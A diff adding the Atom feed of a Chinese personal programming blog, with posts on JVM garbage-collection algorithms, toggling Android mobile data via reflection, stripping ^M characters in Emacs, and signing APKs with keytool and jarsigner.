@@ -1,0 +1,922 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Clark Huang&#39;s Blog</title>
+  <subtitle>Activity is the only road to knowledge.</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://blog.clarkhuang.com/"/>
+  <updated>2016-05-22T06:04:53.000Z</updated>
+  <id>http://blog.clarkhuang.com/</id>
+  
+  <author>
+    <name>Clark Huang</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>深入理解JVM笔记—垃圾回收机制</title>
+    <link href="http://blog.clarkhuang.com/2015/07/07/jvm-note-garbage-collection/"/>
+    <id>http://blog.clarkhuang.com/2015/07/07/jvm-note-garbage-collection/</id>
+    <published>2015-07-07T12:30:56.000Z</published>
+    <updated>2016-05-22T06:04:53.000Z</updated>
+    
+    <content type="html">&lt;p&gt;之前学习的C/C++是需要开发者自己管理内存的分配和释放的，一不当心很容易导致内存泄露。而现在转到Java和Python后，因为它们都自带垃圾回收机制，所以也就不用担心内存的释放问题了，但正因为系统自动帮你做了很多事，导致程序遇到内存溢出，内存泄露的时候，如果不了解这些语言的垃圾回收的原理，就会使得debug的时间成倍的上升。&lt;/p&gt;
+&lt;p&gt;GC操作主要想要解决3个问题：&lt;/p&gt;
+&lt;p&gt;1. 哪些内存需要被回收&lt;/p&gt;
+&lt;p&gt;2. 这些内存该在什么时候被回收&lt;/p&gt;
+&lt;p&gt;3. 这些内存该如何被回收&lt;/p&gt;
+&lt;p&gt;下面就围绕这三个问题进行展开。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h3 id=&quot;1-哪些内存需要被回收&quot;&gt;&lt;a href=&quot;#1-哪些内存需要被回收&quot; class=&quot;headerlink&quot; title=&quot;1. 哪些内存需要被回收&quot;&gt;&lt;/a&gt;1. 哪些内存需要被回收&lt;/h3&gt;&lt;p&gt;在JVM中Stack，Native Method Stack，Program Counter Register这3个部分是线程相关的，而且像Stack，随者方法的进入和退出，其内存的分配和释放是比较方便的。而Heap和Method Area，这两块区域是所有线程共享的，存储程序运行时动态产生的对象，类信息等。内存的分配和回收都是动态的，所以JVM中的垃圾回收器主要关注这两部分的内存。&lt;/p&gt;
+&lt;h3 id=&quot;2-何时回收内存&quot;&gt;&lt;a href=&quot;#2-何时回收内存&quot; class=&quot;headerlink&quot; title=&quot;2. 何时回收内存&quot;&gt;&lt;/a&gt;2. 何时回收内存&lt;/h3&gt;&lt;p&gt;如果要回收内存就需要在回收前先判断哪些内存是需要被回收的，这里主要有两种方法：引用计数器法和可达性分析法。&lt;/p&gt;
+&lt;h4 id=&quot;2-1-引用计数器法&quot;&gt;&lt;a href=&quot;#2-1-引用计数器法&quot; class=&quot;headerlink&quot; title=&quot;2.1 引用计数器法&quot;&gt;&lt;/a&gt;2.1 引用计数器法&lt;/h4&gt;&lt;p&gt;这个算法的思想是：给每个对象添加一个计数器，当这个对象被引用时，计数器+1，当引用失效时，计数器-1，当计数器为0时，则这个对象可以被回收。&lt;/p&gt;
+&lt;p&gt;这个算法的优点是简单，高效，像Python就是使用这种算法的。但是这个算法的缺点是很难解决对象间的循环引用问题。&lt;/p&gt;
+&lt;h4 id=&quot;2-2-可达性分析法&quot;&gt;&lt;a href=&quot;#2-2-可达性分析法&quot; class=&quot;headerlink&quot; title=&quot;2.2 可达性分析法&quot;&gt;&lt;/a&gt;2.2 可达性分析法&lt;/h4&gt;&lt;p&gt;这个算法的思想是将一部分对象作为GC Root，如果其余的某个对象和GC Root间不可达，即不存在关联，则这个对象就被认为是可以回收的。&lt;/p&gt;
+&lt;p&gt;Java中可作为GC Root的对象包括：&lt;/p&gt;
+&lt;li&gt;Stack中引用的对象&lt;/li&gt;&lt;br&gt;&lt;li&gt;Method Area中类的静态属性引用的对象&lt;/li&gt;&lt;br&gt;&lt;li&gt;Method Area中常量引用的对象&lt;/li&gt;&lt;br&gt;&lt;li&gt;Native Method Stack中JNI引用的对象&lt;/li&gt;
+
+&lt;h3 id=&quot;3-如何回收内存&quot;&gt;&lt;a href=&quot;#3-如何回收内存&quot; class=&quot;headerlink&quot; title=&quot;3. 如何回收内存&quot;&gt;&lt;/a&gt;3. 如何回收内存&lt;/h3&gt;&lt;p&gt;确定了哪些内存需要被回收后就需要考虑该如何回收这些没用的内存了。垃圾回收算法主要有3种：Mark-Sweep（标记-清除）算法，Copying（复制）算法，Mark-Compact（标记-整理）算法。最后还有一种是综合了Copying算法和Mark-Compact算法的Generational Collection（分代回收）算法。&lt;/p&gt;
+&lt;h4 id=&quot;3-1-Mark-Sweep（标记-清除）算法&quot;&gt;&lt;a href=&quot;#3-1-Mark-Sweep（标记-清除）算法&quot; class=&quot;headerlink&quot; title=&quot;3.1 Mark-Sweep（标记-清除）算法&quot;&gt;&lt;/a&gt;3.1 Mark-Sweep（标记-清除）算法&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/jvm-note-garbage-collection/mark_sweep_gc.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;这个算法是最简单，最基础的垃圾回收算法。这个算法主要分为两个步骤：首先是Mark（标记），利用之前提过的引用计数器法或可达性分析法标记哪些内存是需要被回收的。然后是Sweep（清除），统一回收被标记了的内存区域。&lt;/p&gt;
+&lt;p&gt;这里有张国外网友Ken Fox制作的GIF，能够很形象的展示不同垃圾回收算法的执行特点。&lt;/p&gt;
+&lt;p&gt;从右面这张图也可以看出作为最基础的垃圾回收算法，Mark-Sweep算法的缺点是Mark和Sweep的效率都不高，同时回收后会产生大量不连续的内存碎片，如果碎片太多了就会导致大对象无法分配，或马上触发另一次GC操作。&lt;/p&gt;
+&lt;h4 id=&quot;3-2-Copying（复制）算法&quot;&gt;&lt;a href=&quot;#3-2-Copying（复制）算法&quot; class=&quot;headerlink&quot; title=&quot;3.2 Copying（复制）算法&quot;&gt;&lt;/a&gt;3.2 Copying（复制）算法&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/jvm-note-garbage-collection/copying_gc.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;其算法思想是将内存平分为两块，首先使用一块内存，当产生GC操作时将这块内存中存活的内存块复制到另一块内存上，然后开始在另一块内存上进行正常的内存分配。这种算法实现简单，运行效率也高，也能有效解决内存碎片的问题，但是内存的容量变为了原来的一半，使得内存的利用率大大降低。&lt;/p&gt;
+&lt;h4 id=&quot;3-3-Mark-Compact（标记-整理）算法&quot;&gt;&lt;a href=&quot;#3-3-Mark-Compact（标记-整理）算法&quot; class=&quot;headerlink&quot; title=&quot;3.3 Mark-Compact（标记-整理）算法&quot;&gt;&lt;/a&gt;3.3 Mark-Compact（标记-整理）算法&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/jvm-note-garbage-collection/mark_compact_gc.gif&quot; alt=&quot;&quot;&gt;Copying算法由于存在复制操作，所以当对象的生存周期比较长时，可能导致复制操作比较多，影响性能。所以针对这种情况可以采用先标记，再整理的做法。其主要步骤是先标记需要释放的内存块，然后就不是清除标记区域了，而是将后面的内存块依次填充到这些被标记的内存块内，相当于将未释放的内存块按序从起始开始放置。这个算法解决了复制算法中内存利用率不高的问题，但是需要标记需要释放的内存块，同时又需要对内存进行整理，导致这个算法的效率较复制算法要低。&lt;/p&gt;
+&lt;h4 id=&quot;3-4-Generational-Collection（分代回收）算法&quot;&gt;&lt;a href=&quot;#3-4-Generational-Collection（分代回收）算法&quot; class=&quot;headerlink&quot; title=&quot;3.4 Generational Collection（分代回收）算法&quot;&gt;&lt;/a&gt;3.4 Generational Collection（分代回收）算法&lt;/h4&gt;&lt;p&gt;由于上面的三种算法都有存在各自的缺点，所以像JVM这样的商业虚拟机都采用分代回收的算法。这种算法是将上述三种算法相接合，根据不同特点的内存块使用不同的算法。在JVM中，我们把Java的堆分为新生代和老年代。新生代的特点是大部分对象的生存时间较短，所以可以使用复制算法。比如HotSpot虚拟机按8:1的比例将内存分为1块Eden空间和2块Survivor空间，每次清理时将Eden的存活对象和其中一块Survivor空间中的对象复制到另一块Survivor空间上，这样做可以使得浪费的内存空间降低到了10%。老年代中的对象一般都是存活时间较长的对象，所以针对块区域，就可以采用标记-清除算法或标记-整理的算法进行清理了。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;之前学习的C/C++是需要开发者自己管理内存的分配和释放的，一不当心很容易导致内存泄露。而现在转到Java和Python后，因为它们都自带垃圾回收机制，所以也就不用担心内存的释放问题了，但正因为系统自动帮你做了很多事，导致程序遇到内存溢出，内存泄露的时候，如果不了解这些语言的垃圾回收的原理，就会使得debug的时间成倍的上升。&lt;/p&gt;
+&lt;p&gt;GC操作主要想要解决3个问题：&lt;/p&gt;
+&lt;p&gt;1. 哪些内存需要被回收&lt;/p&gt;
+&lt;p&gt;2. 这些内存该在什么时候被回收&lt;/p&gt;
+&lt;p&gt;3. 这些内存该如何被回收&lt;/p&gt;
+&lt;p&gt;下面就围绕这三个问题进行展开。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="编程语言" scheme="http://blog.clarkhuang.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
+    
+    
+      <category term="GC" scheme="http://blog.clarkhuang.com/tags/GC/"/>
+    
+      <category term="JVM" scheme="http://blog.clarkhuang.com/tags/JVM/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Android中实现打开或关闭移动数据</title>
+    <link href="http://blog.clarkhuang.com/2014/09/16/android-toggle-mobile-data/"/>
+    <id>http://blog.clarkhuang.com/2014/09/16/android-toggle-mobile-data/</id>
+    <published>2014-09-16T04:00:51.000Z</published>
+    <updated>2016-05-22T05:10:44.000Z</updated>
+    
+    <content type="html">&lt;p&gt;在Android中我们可以通过点击“设置(Settings)”-“流量使用情况(Data usage)”-“移动数据(Mobile data)”来打开或关闭。但是在程序中该如何实现呢？ConnectivityManager中是没有方法可以直接对这个设置进行修改的，所以在Stack Overflow上也有人问了&lt;a href=&quot;http://stackoverflow.com/a/25859551/3103844&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个问题&lt;/a&gt;。最后我查找了一些资料后通过反射的方法解决了这个问题。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;首先查看ConnectivityManager.java，发现里面有&lt;code&gt;public boolean getMobileDataEnabled()&lt;/code&gt;和&lt;code&gt;public void setMobileDataEnabled(boolean enabled)&lt;/code&gt;这两个方法。但是由于这两个方法都被隐藏了，所以我们无法直接使用这两个方法。&lt;/p&gt;
+&lt;p&gt;因此，我们可以通过在自己的代码中加入以下两个方法达到间接访问&lt;code&gt;getMobileDataEnabled()&lt;/code&gt;和&lt;code&gt;setMobileDataEnabled()&lt;/code&gt;这两个方法的目的。&lt;/p&gt;
+&lt;p&gt;1. 检测移动数据打开/关闭&lt;/p&gt;
+&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getMobileDataEnabled&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ConnectivityManager mcm = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Class ownerClass = mcm.getClass();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Method method = ownerClass.getMethod(&lt;span class=&quot;string&quot;&gt;&quot;getMobileDataEnabled&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (Boolean)method.invoke(mcm);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2. 打开/关闭移动数据&lt;/p&gt;
+&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;setMobileDataEnabled&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;boolean&lt;/span&gt; enabled)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ConnectivityManager mcm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Class ownerClass = mcm.getClass();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ownerClass.getMethod(&lt;span class=&quot;string&quot;&gt;&quot;setMobileDataEnabled&quot;&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;boolean&lt;/span&gt;.class).invoke(mcm, enabled);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3. 如何使用这两个方法，其实还是比较简单的，下面就给个简单的例子&lt;/p&gt;
+&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;boolean&lt;/span&gt; isMobileDataEnable = getMobileDataEnabled();&lt;span class=&quot;comment&quot;&gt;//检测移动数据是否打开&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!isMobileDataEnable)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        setMobileDataEnabled(&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);&lt;span class=&quot;comment&quot;&gt;//打开移动数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;同时还需在AndroidManifest.xml中加入两个权限&lt;/p&gt;
+&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;uses-permission&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;android:name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;android.permission.ACCESS_NETWORK_STATE&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;uses-permission&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;android:name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;android.permission.CHANGE_NETWORK_STATE&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在Android中我们可以通过点击“设置(Settings)”-“流量使用情况(Data usage)”-“移动数据(Mobile data)”来打开或关闭。但是在程序中该如何实现呢？ConnectivityManager中是没有方法可以直接对这个设置进行修改的，所以在Stack Overflow上也有人问了&lt;a href=&quot;http://stackoverflow.com/a/25859551/3103844&quot;&gt;这个问题&lt;/a&gt;。最后我查找了一些资料后通过反射的方法解决了这个问题。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="移动计算" scheme="http://blog.clarkhuang.com/categories/%E7%A7%BB%E5%8A%A8%E8%AE%A1%E7%AE%97/"/>
+    
+    
+      <category term="Android" scheme="http://blog.clarkhuang.com/tags/Android/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Emacs去除文档中的^M</title>
+    <link href="http://blog.clarkhuang.com/2014/06/19/emacs-remove-m-in-file/"/>
+    <id>http://blog.clarkhuang.com/2014/06/19/emacs-remove-m-in-file/</id>
+    <published>2014-06-19T12:30:46.000Z</published>
+    <updated>2016-05-22T05:13:12.000Z</updated>
+    
+    <content type="html">&lt;p&gt;由于Unix/Linux和Windows文档的换行符不同，Unix/Linux是&lt;code&gt;\n&lt;/code&gt;，Windows是&lt;code&gt;\r\n&lt;/code&gt;。所以不同操作系统生成的文档在行尾可能有所不同。&lt;/p&gt;
+&lt;p&gt;在Emacs里打开Windows生成的文档经常会在行尾出现&lt;code&gt;^M&lt;/code&gt;符号，看着挺别扭的，更重要的是在Linux下是无法运行包含该符号的脚本。网上搜索到在Emacs中执行以下命令就能去除&lt;code&gt;^M&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;首先选中需要去除^M的文本区域，也可以使用&lt;code&gt;C-x h&lt;/code&gt;选中全部文本。然后使用&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;M-x replace-string C-q C-m RET&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;即可替换所有的^M符号。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;由于Unix/Linux和Windows文档的换行符不同，Unix/Linux是&lt;code&gt;\n&lt;/code&gt;，Windows是&lt;code&gt;\r\n&lt;/code&gt;。所以不同操作系统生成的文档在行尾可能有所不同。&lt;/p&gt;
+&lt;p&gt;在Emacs里打开Windows生成的文档经常会
+    
+    </summary>
+    
+      <category term="编程工具" scheme="http://blog.clarkhuang.com/categories/%E7%BC%96%E7%A8%8B%E5%B7%A5%E5%85%B7/"/>
+    
+    
+      <category term="Emacs" scheme="http://blog.clarkhuang.com/tags/Emacs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何为APK程序签名</title>
+    <link href="http://blog.clarkhuang.com/2014/05/19/how-to-sign-apk-file/"/>
+    <id>http://blog.clarkhuang.com/2014/05/19/how-to-sign-apk-file/</id>
+    <published>2014-05-19T08:00:07.000Z</published>
+    <updated>2016-05-22T06:02:08.000Z</updated>
+    
+    <content type="html">&lt;p&gt;所有的APK程序都需要对其进行签名后才能安装使用，具体操作方法如下：&lt;/p&gt;
+&lt;p&gt;1、创建Key&lt;/p&gt;
+&lt;p&gt;这里需要用到Java SDK的bin目录下的keytool工具，产生keystore文件的命令如下：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;keytool -genkey -alias unlucky.keystore -keyalg RSA -validity 3650 -keystore unlucky.keystore&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;参数说明：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&quot;text-align:center&quot;&gt;参数&lt;/th&gt;
+&lt;th style=&quot;text-align:center&quot;&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-genkey&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;生成密钥&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-alias unlucky.keystore&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;设置别名&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-keyalg RSA&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;设置密钥的算法（如RSA）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-validity 3650&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;设置密钥有效期（天），可以设置的大一些&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-keystore unlucky.keystore&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;设置密钥的文件名&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;运行该命令后会要求输入姓名，国家等信息，最后还要求设置密码，以便签名的时候进行验证。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;2、对Apk进行签名&lt;/p&gt;
+&lt;p&gt;这里需要使用jarsigner工具，同样位于Java SDK的bin目录下，签名的命令如下：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;jarsigner -verbose -keystore unlucky.keystore -signedjar unlucky_signed.apk unlucky.apk unlucky.keystore&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&quot;text-align:center&quot;&gt;参数&lt;/th&gt;
+&lt;th style=&quot;text-align:center&quot;&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-verbose&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;输入签名的详细信息&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-keystore unlucky.keystore&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;设置签名密钥的位置&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-signedjar unlucky_signed.apk unlucky.apk unlucky.keystore&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;表示对文件进行签名，后面三个参数一次为：签名后的文件名，需要签名的文件名，签名的密钥&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;之后会提示要求输入密码，这时输入之前设置的密码就会开始签名了。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：在Eclipse项目的bin目录下或者在Android Studio的build/apk目录下的apk文件是已经被debug.keystore签名过的文件，所以再要签名会报错。&lt;/p&gt;
+&lt;p&gt;可以直接通过IDE进行签名，也可以先将apk解压缩，删除其中的META-INF文件夹，再打包，签名。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;所有的APK程序都需要对其进行签名后才能安装使用，具体操作方法如下：&lt;/p&gt;
+&lt;p&gt;1、创建Key&lt;/p&gt;
+&lt;p&gt;这里需要用到Java SDK的bin目录下的keytool工具，产生keystore文件的命令如下：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;keytool -genkey -alias unlucky.keystore -keyalg RSA -validity 3650 -keystore unlucky.keystore&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;参数说明：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&quot;text-align:center&quot;&gt;参数&lt;/th&gt;
+&lt;th style=&quot;text-align:center&quot;&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-genkey&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;生成密钥&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-alias unlucky.keystore&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;设置别名&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-keyalg RSA&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;设置密钥的算法（如RSA）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-validity 3650&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;设置密钥有效期（天），可以设置的大一些&lt;/td&gt;
+&lt;/tr&gt;
